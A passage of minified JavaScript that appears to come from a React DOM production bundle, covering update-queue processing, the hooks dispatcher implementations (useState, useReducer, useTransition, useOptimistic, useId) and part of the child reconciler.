								if (((Y = H.payload), typeof Y == "function")) {
									S = Y.call(il, S, y);
									break l;
								}
								S = Y;
								break l;
							case 3:
								Y.flags = (Y.flags & -65537) | 128;
							case 0:
								if (
									((Y = H.payload),
									(y =
										typeof Y == "function"
											? Y.call(il, S, y)
											: Y),
									y == null)
								)
									break l;
								S = D({}, S, y);
								break l;
							case 2:
								Jt = !0;
						}
					}
					(y = i.callback),
						y !== null &&
							((l.flags |= 64),
							g && (l.flags |= 8192),
							(g = u.callbacks),
							g === null ? (u.callbacks = [y]) : g.push(y));
				} else
					(g = {
						lane: y,
						tag: i.tag,
						payload: i.payload,
						callback: i.callback,
						next: null,
					}),
						x === null ? ((v = x = g), (s = S)) : (x = x.next = g),
						(c |= y);
				if (((i = i.next), i === null)) {
					if (((i = u.shared.pending), i === null)) break;
					(g = i),
						(i = g.next),
						(g.next = null),
						(u.lastBaseUpdate = g),
						(u.shared.pending = null);
				}
			} while (!0);
			x === null && (s = S),
				(u.baseState = s),
				(u.firstBaseUpdate = v),
				(u.lastBaseUpdate = x),
				n === null && (u.shared.lanes = 0),
				(ae |= c),
				(l.lanes = c),
				(l.memoizedState = S);
		}
	}
	function bs(l, t) {
		if (typeof l != "function") throw Error(h(191, l));
		l.call(t);
	}
	function ps(l, t) {
		var e = l.callbacks;
		if (e !== null)
			for (l.callbacks = null, l = 0; l < e.length; l++) bs(e[l], t);
	}
	var la = E(null),
		Ku = E(0);
	function Ss(l, t) {
		(l = Gt), z(Ku, l), z(la, t), (Gt = l | t.baseLanes);
	}
	function Uc() {
		z(Ku, Gt), z(la, la.current);
	}
	function Hc() {
		(Gt = Ku.current), M(la), M(Ku);
	}
	var $t = 0,
		L = null,
		nl = null,
		Tl = null,
		Ju = !1,
		ta = !1,
		Me = !1,
		ku = 0,
		Za = 0,
		ea = null,
		S0 = 0;
	function bl() {
		throw Error(h(321));
	}
	function Cc(l, t) {
		if (t === null) return !1;
		for (var e = 0; e < t.length && e < l.length; e++)
			if (!Il(l[e], t[e])) return !1;
		return !0;
	}
	function Bc(l, t, e, a, u, n) {
		return (
			($t = n),
			(L = t),
			(t.memoizedState = null),
			(t.updateQueue = null),
			(t.lanes = 0),
			(b.H = l === null || l.memoizedState === null ? ur : nr),
			(Me = !1),
			(n = e(a, u)),
			(Me = !1),
			ta && (n = Es(t, e, a, u)),
			Ts(l),
			n
		);
	}
	function Ts(l) {
		b.H = ln;
		var t = nl !== null && nl.next !== null;
		if (
			(($t = 0),
			(Tl = nl = L = null),
			(Ju = !1),
			(Za = 0),
			(ea = null),
			t)
		)
			throw Error(h(300));
		l === null ||
			Al ||
			((l = l.dependencies), l !== null && Xu(l) && (Al = !0));
	}
	function Es(l, t, e, a) {
		L = l;
		var u = 0;
		do {
			if ((ta && (ea = null), (Za = 0), (ta = !1), 25 <= u))
				throw Error(h(301));
			if (((u += 1), (Tl = nl = null), l.updateQueue != null)) {
				var n = l.updateQueue;
				(n.lastEffect = null),
					(n.events = null),
					(n.stores = null),
					n.memoCache != null && (n.memoCache.index = 0);
			}
			(b.H = M0), (n = t(e, a));
		} while (ta);
		return n;
	}
	function T0() {
		var l = b.H,
			t = l.useState()[0];
		return (
			(t = typeof t.then == "function" ? Va(t) : t),
			(l = l.useState()[0]),
			(nl !== null ? nl.memoizedState : null) !== l && (L.flags |= 1024),
			t
		);
	}
	function qc() {
		var l = ku !== 0;
		return (ku = 0), l;
	}
	function wc(l, t, e) {
		(t.updateQueue = l.updateQueue), (t.flags &= -2053), (l.lanes &= ~e);
	}
	function Yc(l) {
		if (Ju) {
			for (l = l.memoizedState; l !== null; ) {
				var t = l.queue;
				t !== null && (t.pending = null), (l = l.next);
			}
			Ju = !1;
		}
		($t = 0), (Tl = nl = L = null), (ta = !1), (Za = ku = 0), (ea = null);
	}
	function Ql() {
		var l = {
			memoizedState: null,
			baseState: null,
			baseQueue: null,
			queue: null,
			next: null,
		};
		return (
			Tl === null ? (L.memoizedState = Tl = l) : (Tl = Tl.next = l), Tl
		);
	}
	function El() {
		if (nl === null) {
			var l = L.alternate;
			l = l !== null ? l.memoizedState : null;
		} else l = nl.next;
		var t = Tl === null ? L.memoizedState : Tl.next;
		if (t !== null) (Tl = t), (nl = l);
		else {
			if (l === null)
				throw L.alternate === null ? Error(h(467)) : Error(h(310));
			(nl = l),
				(l = {
					memoizedState: nl.memoizedState,
					baseState: nl.baseState,
					baseQueue: nl.baseQueue,
					queue: nl.queue,
					next: null,
				}),
				Tl === null ? (L.memoizedState = Tl = l) : (Tl = Tl.next = l);
		}
		return Tl;
	}
	function Gc() {
		return {
			lastEffect: null,
			events: null,
			stores: null,
			memoCache: null,
		};
	}
	function Va(l) {
		var t = Za;
		return (
			(Za += 1),
			ea === null && (ea = []),
			(l = ys(ea, l, t)),
			(t = L),
			(Tl === null ? t.memoizedState : Tl.next) === null &&
				((t = t.alternate),
				(b.H = t === null || t.memoizedState === null ? ur : nr)),
			l
		);
	}
	function Wu(l) {
		if (l !== null && typeof l == "object") {
			if (typeof l.then == "function") return Va(l);
			if (l.$$typeof === vl) return Bl(l);
		}
		throw Error(h(438, String(l)));
	}
	function Xc(l) {
		var t = null,
			e = L.updateQueue;
		if ((e !== null && (t = e.memoCache), t == null)) {
			var a = L.alternate;
			a !== null &&
				((a = a.updateQueue),
				a !== null &&
					((a = a.memoCache),
					a != null &&
						(t = {
							data: a.data.map(function (u) {
								return u.slice();
							}),
							index: 0,
						})));
		}
		if (
			(t == null && (t = { data: [], index: 0 }),
			e === null && ((e = Gc()), (L.updateQueue = e)),
			(e.memoCache = t),
			(e = t.data[t.index]),
			e === void 0)
		)
			for (e = t.data[t.index] = Array(l), a = 0; a < l; a++) e[a] = Ue;
		return t.index++, e;
	}
	function Ht(l, t) {
		return typeof t == "function" ? t(l) : t;
	}
	function $u(l) {
		var t = El();
		return Qc(t, nl, l);
	}
	function Qc(l, t, e) {
		var a = l.queue;
		if (a === null) throw Error(h(311));
		a.lastRenderedReducer = e;
		var u = l.baseQueue,
			n = a.pending;
		if (n !== null) {
			if (u !== null) {
				var c = u.next;
				(u.next = n.next), (n.next = c);
			}
			(t.baseQueue = u = n), (a.pending = null);
		}
		if (((n = l.baseState), u === null)) l.memoizedState = n;
		else {
			t = u.next;
			var i = (c = null),
				s = null,
				v = t,
				x = !1;
			do {
				var S = v.lane & -536870913;
				if (S !== v.lane ? (k & S) === S : ($t & S) === S) {
					var y = v.revertLane;
					if (y === 0)
						s !== null &&
							(s = s.next =
								{
									lane: 0,
									revertLane: 0,
									action: v.action,
									hasEagerState: v.hasEagerState,
									eagerState: v.eagerState,
									next: null,
								}),
							S === Ie && (x = !0);
					else if (($t & y) === y) {
						(v = v.next), y === Ie && (x = !0);
						continue;
					} else
						(S = {
							lane: 0,
							revertLane: v.revertLane,
							action: v.action,
							hasEagerState: v.hasEagerState,
							eagerState: v.eagerState,
							next: null,
						}),
							s === null
								? ((i = s = S), (c = n))
								: (s = s.next = S),
							(L.lanes |= y),
							(ae |= y);
					(S = v.action),
						Me && e(n, S),
						(n = v.hasEagerState ? v.eagerState : e(n, S));
				} else
					(y = {
						lane: S,
						revertLane: v.revertLane,
						action: v.action,
						hasEagerState: v.hasEagerState,
						eagerState: v.eagerState,
						next: null,
					}),
						s === null ? ((i = s = y), (c = n)) : (s = s.next = y),
						(L.lanes |= S),
						(ae |= S);
				v = v.next;
			} while (v !== null && v !== t);
			if (
				(s === null ? (c = n) : (s.next = i),
				!Il(n, l.memoizedState) &&
					((Al = !0), x && ((e = Pe), e !== null)))
			)
				throw e;
			(l.memoizedState = n),
				(l.baseState = c),
				(l.baseQueue = s),
				(a.lastRenderedState = n);
		}
		return u === null && (a.lanes = 0), [l.memoizedState, a.dispatch];
	}
	function Lc(l) {
		var t = El(),
			e = t.queue;
		if (e === null) throw Error(h(311));
		e.lastRenderedReducer = l;
		var a = e.dispatch,
			u = e.pending,
			n = t.memoizedState;
		if (u !== null) {
			e.pending = null;
			var c = (u = u.next);
			do (n = l(n, c.action)), (c = c.next);
			while (c !== u);
			Il(n, t.memoizedState) || (Al = !0),
				(t.memoizedState = n),
				t.baseQueue === null && (t.baseState = n),
				(e.lastRenderedState = n);
		}
		return [n, a];
	}
	function Ns(l, t, e) {
		var a = L,
			u = El(),
			n = tl;
		if (n) {
			if (e === void 0) throw Error(h(407));
			e = e();
		} else e = t();
		var c = !Il((nl || u).memoizedState, e);
		c && ((u.memoizedState = e), (Al = !0)), (u = u.queue);
		var i = As.bind(null, a, u, l);
		if (
			(Ka(2048, 8, i, [l]),
			u.getSnapshot !== t ||
				c ||
				(Tl !== null && Tl.memoizedState.tag & 1))
		) {
			if (
				((a.flags |= 2048),
				aa(9, Fu(), zs.bind(null, a, u, e, t), null),
				ol === null)
			)
				throw Error(h(349));
			n || ($t & 124) !== 0 || js(a, t, e);
		}
		return e;
	}
	function js(l, t, e) {
		(l.flags |= 16384),
			(l = { getSnapshot: t, value: e }),
			(t = L.updateQueue),
			t === null
				? ((t = Gc()), (L.updateQueue = t), (t.stores = [l]))
				: ((e = t.stores), e === null ? (t.stores = [l]) : e.push(l));
	}
	function zs(l, t, e, a) {
		(t.value = e), (t.getSnapshot = a), Ms(t) && Os(l);
	}
	function As(l, t, e) {
		return e(function () {
			Ms(t) && Os(l);
		});
	}
	function Ms(l) {
		var t = l.getSnapshot;
		l = l.value;
		try {
			var e = t();
			return !Il(l, e);
		} catch {
			return !0;
		}
	}
	function Os(l) {
		var t = ke(l, 2);
		t !== null && ut(t, l, 2);
	}
	function Zc(l) {
		var t = Ql();
		if (typeof l == "function") {
			var e = l;
			if (((l = e()), Me)) {
				Lt(!0);
				try {
					e();
				} finally {
					Lt(!1);
				}
			}
		}
		return (
			(t.memoizedState = t.baseState = l),
			(t.queue = {
				pending: null,
				lanes: 0,
				dispatch: null,
				lastRenderedReducer: Ht,
				lastRenderedState: l,
			}),
			t
		);
	}
	function _s(l, t, e, a) {
		return (l.baseState = e), Qc(l, nl, typeof a == "function" ? a : Ht);
	}
	function E0(l, t, e, a, u) {
		if (Pu(l)) throw Error(h(485));
		if (((l = t.action), l !== null)) {
			var n = {
				payload: u,
				action: l,
				next: null,
				isTransition: !0,
				status: "pending",
				value: null,
				reason: null,
				listeners: [],
				then: function (c) {
					n.listeners.push(c);
				},
			};
			b.T !== null ? e(!0) : (n.isTransition = !1),
				a(n),
				(e = t.pending),
				e === null
					? ((n.next = t.pending = n), Ds(t, n))
					: ((n.next = e.next), (t.pending = e.next = n));
		}
	}
	function Ds(l, t) {
		var e = t.action,
			a = t.payload,
			u = l.state;
		if (t.isTransition) {
			var n = b.T,
				c = {};
			b.T = c;
			try {
				var i = e(u, a),
					s = b.S;
				s !== null && s(c, i), Rs(l, t, i);
			} catch (v) {
				Vc(l, t, v);
			} finally {
				b.T = n;
			}
		} else
			try {
				(n = e(u, a)), Rs(l, t, n);
			} catch (v) {
				Vc(l, t, v);
			}
	}
	function Rs(l, t, e) {
		e !== null && typeof e == "object" && typeof e.then == "function"
			? e.then(
					function (a) {
						Us(l, t, a);
					},
					function (a) {
						return Vc(l, t, a);
					}
			  )
			: Us(l, t, e);
	}
	function Us(l, t, e) {
		(t.status = "fulfilled"),
			(t.value = e),
			Hs(t),
			(l.state = e),
			(t = l.pending),
			t !== null &&
				((e = t.next),
				e === t
					? (l.pending = null)
					: ((e = e.next), (t.next = e), Ds(l, e)));
	}
	function Vc(l, t, e) {
		var a = l.pending;
		if (((l.pending = null), a !== null)) {
			a = a.next;
			do (t.status = "rejected"), (t.reason = e), Hs(t), (t = t.next);
			while (t !== a);
		}
		l.action = null;
	}
	function Hs(l) {
		l = l.listeners;
		for (var t = 0; t < l.length; t++) (0, l[t])();
	}
	function Cs(l, t) {
		return t;
	}
	function Bs(l, t) {
		if (tl) {
			var e = ol.formState;
			if (e !== null) {
				l: {
					var a = L;
					if (tl) {
						if (gl) {
							t: {
								for (var u = gl, n = St; u.nodeType !== 8; ) {
									if (!n) {
										u = null;
										break t;
									}
									if (((u = gt(u.nextSibling)), u === null)) {
										u = null;
										break t;
									}
								}
								(n = u.data),
									(u = n === "F!" || n === "F" ? u : null);
							}
							if (u) {
								(gl = gt(u.nextSibling)), (a = u.data === "F!");
								break l;
							}
						}
						Ne(a);
					}
					a = !1;
				}
				a && (t = e[0]);
			}
		}
		return (
			(e = Ql()),
			(e.memoizedState = e.baseState = t),
			(a = {
				pending: null,
				lanes: 0,
				dispatch: null,
				lastRenderedReducer: Cs,
				lastRenderedState: t,
			}),
			(e.queue = a),
			(e = tr.bind(null, L, a)),
			(a.dispatch = e),
			(a = Zc(!1)),
			(n = $c.bind(null, L, !1, a.queue)),
			(a = Ql()),
			(u = { state: t, dispatch: null, action: l, pending: null }),
			(a.queue = u),
			(e = E0.bind(null, L, u, n, e)),
			(u.dispatch = e),
			(a.memoizedState = l),
			[t, e, !1]
		);
	}
	function qs(l) {
		var t = El();
		return ws(t, nl, l);
	}
	function ws(l, t, e) {
		if (
			((t = Qc(l, t, Cs)[0]),
			(l = $u(Ht)[0]),
			typeof t == "object" && t !== null && typeof t.then == "function")
		)
			try {
				var a = Va(t);
			} catch (c) {
				throw c === Ya ? Zu : c;
			}
		else a = t;
		t = El();
		var u = t.queue,
			n = u.dispatch;
		return (
			e !== t.memoizedState &&
				((L.flags |= 2048), aa(9, Fu(), N0.bind(null, u, e), null)),
			[a, n, l]
		);
	}
	function N0(l, t) {
		l.action = t;
	}
	function Ys(l) {
		var t = El(),
			e = nl;
		if (e !== null) return ws(t, e, l);
		El(), (t = t.memoizedState), (e = El());
		var a = e.queue.dispatch;
		return (e.memoizedState = l), [t, a, !1];
	}
	function aa(l, t, e, a) {
		return (
			(l = { tag: l, create: e, deps: a, inst: t, next: null }),
			(t = L.updateQueue),
			t === null && ((t = Gc()), (L.updateQueue = t)),
			(e = t.lastEffect),
			e === null
				? (t.lastEffect = l.next = l)
				: ((a = e.next),
				  (e.next = l),
				  (l.next = a),
				  (t.lastEffect = l)),
			l
		);
	}
	function Fu() {
		return { destroy: void 0, resource: void 0 };
	}
	function Gs() {
		return El().memoizedState;
	}
	function Iu(l, t, e, a) {
		var u = Ql();
		(a = a === void 0 ? null : a),
			(L.flags |= l),
			(u.memoizedState = aa(1 | t, Fu(), e, a));
	}
	function Ka(l, t, e, a) {
		var u = El();
		a = a === void 0 ? null : a;
		var n = u.memoizedState.inst;
		nl !== null && a !== null && Cc(a, nl.memoizedState.deps)
			? (u.memoizedState = aa(t, n, e, a))
			: ((L.flags |= l), (u.memoizedState = aa(1 | t, n, e, a)));
	}
	function Xs(l, t) {
		Iu(8390656, 8, l, t);
	}
	function Qs(l, t) {
		Ka(2048, 8, l, t);
	}
	function Ls(l, t) {
		return Ka(4, 2, l, t);
	}
	function Zs(l, t) {
		return Ka(4, 4, l, t);
	}
	function Vs(l, t) {
		if (typeof t == "function") {
			l = l();
			var e = t(l);
			return function () {
				typeof e == "function" ? e() : t(null);
			};
		}
		if (t != null)
			return (
				(l = l()),
				(t.current = l),
				function () {
					t.current = null;
				}
			);
	}
	function Ks(l, t, e) {
		(e = e != null ? e.concat([l]) : null),
			Ka(4, 4, Vs.bind(null, t, l), e);
	}
	function Kc() {}
	function Js(l, t) {
		var e = El();
		t = t === void 0 ? null : t;
		var a = e.memoizedState;
		return t !== null && Cc(t, a[1])
			? a[0]
			: ((e.memoizedState = [l, t]), l);
	}
	function ks(l, t) {
		var e = El();
		t = t === void 0 ? null : t;
		var a = e.memoizedState;
		if (t !== null && Cc(t, a[1])) return a[0];
		if (((a = l()), Me)) {
			Lt(!0);
			try {
				l();
			} finally {
				Lt(!1);
			}
		}
		return (e.memoizedState = [a, t]), a;
	}
	function Jc(l, t, e) {
		return e === void 0 || ($t & 1073741824) !== 0
			? (l.memoizedState = t)
			: ((l.memoizedState = e), (l = Fr()), (L.lanes |= l), (ae |= l), e);
	}
	function Ws(l, t, e, a) {
		return Il(e, t)
			? e
			: la.current !== null
			? ((l = Jc(l, e, a)), Il(l, t) || (Al = !0), l)
			: ($t & 42) === 0
			? ((Al = !0), (l.memoizedState = e))
			: ((l = Fr()), (L.lanes |= l), (ae |= l), t);
	}
	function $s(l, t, e, a, u) {
		var n = A.p;
		A.p = n !== 0 && 8 > n ? n : 8;
		var c = b.T,
			i = {};
		(b.T = i), $c(l, !1, t, e);
		try {
			var s = u(),
				v = b.S;
			if (
				(v !== null && v(i, s),
				s !== null &&
					typeof s == "object" &&
					typeof s.then == "function")
			) {
				var x = p0(s, a);
				Ja(l, t, x, at(l));
			} else Ja(l, t, a, at(l));
		} catch (S) {
			Ja(
				l,
				t,
				{ then: function () {}, status: "rejected", reason: S },
				at()
			);
		} finally {
			(A.p = n), (b.T = c);
		}
	}
	function j0() {}
	function kc(l, t, e, a) {
		if (l.tag !== 5) throw Error(h(476));
		var u = Fs(l).queue;
		$s(
			l,
			u,
			t,
			q,
			e === null
				? j0
				: function () {
						return Is(l), e(a);
				  }
		);
	}
	function Fs(l) {
		var t = l.memoizedState;
		if (t !== null) return t;
		t = {
			memoizedState: q,
			baseState: q,
			baseQueue: null,
			queue: {
				pending: null,
				lanes: 0,
				dispatch: null,
				lastRenderedReducer: Ht,
				lastRenderedState: q,
			},
			next: null,
		};
		var e = {};
		return (
			(t.next = {
				memoizedState: e,
				baseState: e,
				baseQueue: null,
				queue: {
					pending: null,
					lanes: 0,
					dispatch: null,
					lastRenderedReducer: Ht,
					lastRenderedState: e,
				},
				next: null,
			}),
			(l.memoizedState = t),
			(l = l.alternate),
			l !== null && (l.memoizedState = t),
			t
		);
	}
	function Is(l) {
		var t = Fs(l).next.queue;
		Ja(l, t, {}, at());
	}
	function Wc() {
		return Bl(ou);
	}
	function Ps() {
		return El().memoizedState;
	}
	function lr() {
		return El().memoizedState;
	}
	function z0(l) {
		for (var t = l.return; t !== null; ) {
			switch (t.tag) {
				case 24:
				case 3:
					var e = at();
					l = kt(e);
					var a = Wt(t, l, e);
					a !== null && (ut(a, t, e), Xa(a, t, e)),
						(t = { cache: jc() }),
						(l.payload = t);
					return;
			}
			t = t.return;
		}
	}
	function A0(l, t, e) {
		var a = at();
		(e = {
			lane: a,
			revertLane: 0,
			action: e,
			hasEagerState: !1,
			eagerState: null,
			next: null,
		}),
			Pu(l)
				? er(t, e)
				: ((e = vc(l, t, e, a)),
				  e !== null && (ut(e, l, a), ar(e, t, a)));
	}
	function tr(l, t, e) {
		var a = at();
		Ja(l, t, e, a);
	}
	function Ja(l, t, e, a) {
		var u = {
			lane: a,
			revertLane: 0,
			action: e,
			hasEagerState: !1,
			eagerState: null,
			next: null,
		};
		if (Pu(l)) er(t, u);
		else {
			var n = l.alternate;
			if (
				l.lanes === 0 &&
				(n === null || n.lanes === 0) &&
				((n = t.lastRenderedReducer), n !== null)
			)
				try {
					var c = t.lastRenderedState,
						i = n(c, e);
					if (((u.hasEagerState = !0), (u.eagerState = i), Il(i, c)))
						return Bu(l, t, u, 0), ol === null && Cu(), !1;
				} catch {
				} finally {
				}
			if (((e = vc(l, t, u, a)), e !== null))
				return ut(e, l, a), ar(e, t, a), !0;
		}
		return !1;
	}
	function $c(l, t, e, a) {
		if (
			((a = {
				lane: 2,
				revertLane: Mi(),
				action: a,
				hasEagerState: !1,
				eagerState: null,
				next: null,
			}),
			Pu(l))
		) {
			if (t) throw Error(h(479));
		} else (t = vc(l, e, a, 2)), t !== null && ut(t, l, 2);
	}
	function Pu(l) {
		var t = l.alternate;
		return l === L || (t !== null && t === L);
	}
	function er(l, t) {
		ta = Ju = !0;
		var e = l.pending;
		e === null ? (t.next = t) : ((t.next = e.next), (e.next = t)),
			(l.pending = t);
	}
	function ar(l, t, e) {
		if ((e & 4194048) !== 0) {
			var a = t.lanes;
			(a &= l.pendingLanes), (e |= a), (t.lanes = e), of(l, e);
		}
	}
	var ln = {
			readContext: Bl,
			use: Wu,
			useCallback: bl,
			useContext: bl,
			useEffect: bl,
			useImperativeHandle: bl,
			useLayoutEffect: bl,
			useInsertionEffect: bl,
			useMemo: bl,
			useReducer: bl,
			useRef: bl,
			useState: bl,
			useDebugValue: bl,
			useDeferredValue: bl,
			useTransition: bl,
			useSyncExternalStore: bl,
			useId: bl,
			useHostTransitionStatus: bl,
			useFormState: bl,
			useActionState: bl,
			useOptimistic: bl,
			useMemoCache: bl,
			useCacheRefresh: bl,
		},
		ur = {
			readContext: Bl,
			use: Wu,
			useCallback: function (l, t) {
				return (Ql().memoizedState = [l, t === void 0 ? null : t]), l;
			},
			useContext: Bl,
			useEffect: Xs,
			useImperativeHandle: function (l, t, e) {
				(e = e != null ? e.concat([l]) : null),
					Iu(4194308, 4, Vs.bind(null, t, l), e);
			},
			useLayoutEffect: function (l, t) {
				return Iu(4194308, 4, l, t);
			},
			useInsertionEffect: function (l, t) {
				Iu(4, 2, l, t);
			},
			useMemo: function (l, t) {
				var e = Ql();
				t = t === void 0 ? null : t;
				var a = l();
				if (Me) {
					Lt(!0);
					try {
						l();
					} finally {
						Lt(!1);
					}
				}
				return (e.memoizedState = [a, t]), a;
			},
			useReducer: function (l, t, e) {
				var a = Ql();
				if (e !== void 0) {
					var u = e(t);
					if (Me) {
						Lt(!0);
						try {
							e(t);
						} finally {
							Lt(!1);
						}
					}
				} else u = t;
				return (
					(a.memoizedState = a.baseState = u),
					(l = {
						pending: null,
						lanes: 0,
						dispatch: null,
						lastRenderedReducer: l,
						lastRenderedState: u,
					}),
					(a.queue = l),
					(l = l.dispatch = A0.bind(null, L, l)),
					[a.memoizedState, l]
				);
			},
			useRef: function (l) {
				var t = Ql();
				return (l = { current: l }), (t.memoizedState = l);
			},
			useState: function (l) {
				l = Zc(l);
				var t = l.queue,
					e = tr.bind(null, L, t);
				return (t.dispatch = e), [l.memoizedState, e];
			},
			useDebugValue: Kc,
			useDeferredValue: function (l, t) {
				var e = Ql();
				return Jc(e, l, t);
			},
			useTransition: function () {
				var l = Zc(!1);
				return (
					(l = $s.bind(null, L, l.queue, !0, !1)),
					(Ql().memoizedState = l),
					[!1, l]
				);
			},
			useSyncExternalStore: function (l, t, e) {
				var a = L,
					u = Ql();
				if (tl) {
					if (e === void 0) throw Error(h(407));
					e = e();
				} else {
					if (((e = t()), ol === null)) throw Error(h(349));
					(k & 124) !== 0 || js(a, t, e);
				}
				u.memoizedState = e;
				var n = { value: e, getSnapshot: t };
				return (
					(u.queue = n),
					Xs(As.bind(null, a, n, l), [l]),
					(a.flags |= 2048),
					aa(9, Fu(), zs.bind(null, a, n, e, t), null),
					e
				);
			},
			useId: function () {
				var l = Ql(),
					t = ol.identifierPrefix;
				if (tl) {
					var e = Dt,
						a = _t;
					(e = (a & ~(1 << (32 - Fl(a) - 1))).toString(32) + e),
						(t = "«" + t + "R" + e),
						(e = ku++),
						0 < e && (t += "H" + e.toString(32)),
						(t += "»");
				} else (e = S0++), (t = "«" + t + "r" + e.toString(32) + "»");
				return (l.memoizedState = t);
			},
			useHostTransitionStatus: Wc,
			useFormState: Bs,
			useActionState: Bs,
			useOptimistic: function (l) {
				var t = Ql();
				t.memoizedState = t.baseState = l;
				var e = {
					pending: null,
					lanes: 0,
					dispatch: null,
					lastRenderedReducer: null,
					lastRenderedState: null,
				};
				return (
					(t.queue = e),
					(t = $c.bind(null, L, !0, e)),
					(e.dispatch = t),
					[l, t]
				);
			},
			useMemoCache: Xc,
			useCacheRefresh: function () {
				return (Ql().memoizedState = z0.bind(null, L));
			},
		},
		nr = {
			readContext: Bl,
			use: Wu,
			useCallback: Js,
			useContext: Bl,
			useEffect: Qs,
			useImperativeHandle: Ks,
			useInsertionEffect: Ls,
			useLayoutEffect: Zs,
			useMemo: ks,
			useReducer: $u,
			useRef: Gs,
			useState: function () {
				return $u(Ht);
			},
			useDebugValue: Kc,
			useDeferredValue: function (l, t) {
				var e = El();
				return Ws(e, nl.memoizedState, l, t);
			},
			useTransition: function () {
				var l = $u(Ht)[0],
					t = El().memoizedState;
				return [typeof l == "boolean" ? l : Va(l), t];
			},
			useSyncExternalStore: Ns,
			useId: Ps,
			useHostTransitionStatus: Wc,
			useFormState: qs,
			useActionState: qs,
			useOptimistic: function (l, t) {
				var e = El();
				return _s(e, nl, l, t);
			},
			useMemoCache: Xc,
			useCacheRefresh: lr,
		},
		M0 = {
			readContext: Bl,
			use: Wu,
			useCallback: Js,
			useContext: Bl,
			useEffect: Qs,
			useImperativeHandle: Ks,
			useInsertionEffect: Ls,
			useLayoutEffect: Zs,
			useMemo: ks,
			useReducer: Lc,
			useRef: Gs,
			useState: function () {
				return Lc(Ht);
			},
			useDebugValue: Kc,
			useDeferredValue: function (l, t) {
				var e = El();
				return nl === null
					? Jc(e, l, t)
					: Ws(e, nl.memoizedState, l, t);
			},
			useTransition: function () {
				var l = Lc(Ht)[0],
					t = El().memoizedState;
				return [typeof l == "boolean" ? l : Va(l), t];
			},
			useSyncExternalStore: Ns,
			useId: Ps,
			useHostTransitionStatus: Wc,
			useFormState: Ys,
			useActionState: Ys,
			useOptimistic: function (l, t) {
				var e = El();
				return nl !== null
					? _s(e, nl, l, t)
					: ((e.baseState = l), [l, e.queue.dispatch]);
			},
			useMemoCache: Xc,
			useCacheRefresh: lr,
		},
		ua = null,
		ka = 0;
	function tn(l) {
		var t = ka;
		return (ka += 1), ua === null && (ua = []), ys(ua, l, t);
	}
	function Wa(l, t) {
		(t = t.props.ref), (l.ref = t !== void 0 ? t : null);
	}
	function en(l, t) {
		throw t.$$typeof === W
			? Error(h(525))
			: ((l = Object.prototype.toString.call(t)),
			  Error(
					h(
						31,
						l === "[object Object]"
							? "object with keys {" +
									Object.keys(t).join(", ") +
									"}"
							: l
					)
			  ));
	}
	function cr(l) {
		var t = l._init;
		return t(l._payload);
	}
	function ir(l) {
		function t(d, o) {
			if (l) {
				var m = d.deletions;
				m === null ? ((d.deletions = [o]), (d.flags |= 16)) : m.push(o);
			}
		}
		function e(d, o) {
			if (!l) return null;
			for (; o !== null; ) t(d, o), (o = o.sibling);
			return null;
		}
		function a(d) {
			for (var o = new Map(); d !== null; )
				d.key !== null ? o.set(d.key, d) : o.set(d.index, d),
					(d = d.sibling);
			return o;
		}
		function u(d, o) {
			return (d = Ot(d, o)), (d.index = 0), (d.sibling = null), d;
		}
		function n(d, o, m) {
			return (
				(d.index = m),
				l
					? ((m = d.alternate),
					  m !== null
							? ((m = m.index),
							  m < o ? ((d.flags |= 67108866), o) : m)
							: ((d.flags |= 67108866), o))
					: ((d.flags |= 1048576), o)
			);
		}
		function c(d) {
			return l && d.alternate === null && (d.flags |= 67108866), d;
		}
		function i(d, o, m, p) {
			return o === null || o.tag !== 6
				? ((o = gc(m, d.mode, p)), (o.return = d), o)
				: ((o = u(o, m)), (o.return = d), o);
		}
		function s(d, o, m, p) {
			var O = m.type;
			return O === J
				? x(d, o, m.props.children, p, m.key)
				: o !== null &&
				  (o.elementType === O ||
						(typeof O == "object" &&
							O !== null &&
							O.$$typeof === kl &&
							cr(O) === o.type))
				? ((o = u(o, m.props)), Wa(o, m), (o.return = d), o)
				: ((o = wu(m.type, m.key, m.props, null, d.mode, p)),
				  Wa(o, m),
				  (o.return = d),
				  o);
		}
		function v(d, o, m, p) {
			return o === null ||
				o.tag !== 4 ||
				o.stateNode.containerInfo !== m.containerInfo ||
				o.stateNode.implementation !== m.implementation
				? ((o = xc(m, d.mode, p)), (o.return = d), o)
				: ((o = u(o, m.children || [])), (o.return = d), o);
		}
		function x(d, o, m, p, O) {
			return o === null || o.tag !== 7
				? ((o = pe(m, d.mode, p, O)), (o.return = d), o)
				: ((o = u(o, m)), (o.return = d), o);
		}
		function S(d, o, m) {
			if (
				(typeof o == "string" && o !== "") ||
				typeof o == "number" ||
				typeof o == "bigint"
			)
				return (o = gc("" + o, d.mode, m)), (o.return = d), o;
			if (typeof o == "object" && o !== null) {
				switch (o.$$typeof) {
					case $:
						return (
							(m = wu(o.type, o.key, o.props, null, d.mode, m)),
							Wa(m, o),
							(m.return = d),
							m
						);
					case el:
						return (o = xc(o, d.mode, m)), (o.return = d), o;
					case kl:
						var p = o._init;
						return (o = p(o._payload)), S(d, o, m);
				}
				if (Hl(o) || Ul(o))
					return (o = pe(o, d.mode, m, null)), (o.return = d), o;
				if (typeof o.then == "function") return S(d, tn(o), m);
				if (o.$$typeof === vl) return S(d, Qu(d, o), m);
				en(d, o);
			}
			return null;
		}
		function y(d, o, m, p) {
			var O = o !== null ? o.key : null;
			if (
				(typeof m == "string" && m !== "") ||
				typeof m == "number" ||
				typeof m == "bigint"
			)
				return O !== null ? null : i(d, o, "" + m, p);
			if (typeof m == "object" && m !== null) {
				switch (m.$$typeof) {
					case $:
						return m.key === O ? s(d, o, m, p) : null;
					case el:
						return m.key === O ? v(d, o, m, p) : null;
					case kl:
						return (
							(O = m._init), (m = O(m._payload)), y(d, o, m, p)
						);
				}
				if (Hl(m) || Ul(m))
					return O !== null ? null : x(d, o, m, p, null);
				if (typeof m.then == "function") return y(d, o, tn(m), p);
				if (m.$$typeof === vl) return y(d, o, Qu(d, m), p);
				en(d, m);
			}
			return null;
		}
		function g(d, o, m, p, O) {
			if (
				(typeof p == "string" && p !== "") ||
				typeof p == "number" ||
				typeof p == "bigint"
			)
				return (d = d.get(m) || null), i(o, d, "" + p, O);
			if (typeof p == "object" && p !== null) {
				switch (p.$$typeof) {
					case $:
						return (
							(d = d.get(p.key === null ? m : p.key) || null),
							s(o, d, p, O)
						);
					case el:
						return (
							(d = d.get(p.key === null ? m : p.key) || null),
							v(o, d, p, O)
						);
					case kl:
						var Z = p._init;
						return (p = Z(p._payload)), g(d, o, m, p, O);
				}
				if (Hl(p) || Ul(p))
